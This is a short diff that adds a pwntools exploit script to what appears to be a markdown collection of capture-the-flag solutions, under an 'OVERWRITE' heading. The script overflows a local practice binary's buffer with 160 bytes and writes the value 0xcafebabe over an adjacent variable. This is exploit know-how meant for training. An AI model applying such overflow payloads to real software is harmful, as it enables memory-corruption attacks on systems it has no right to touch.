@@ -20,3 +20,13 @@ io.interactive()
 
 # ***OVERWRITE***
 
+```
+from pwn import*
+io= process("./overwrite")
+payload = b"A"*160
+payload += p64(0xcafebabe)
+io.sendline(payload)
+io.interactive()
+```
+
+# ***OVERFLOW***
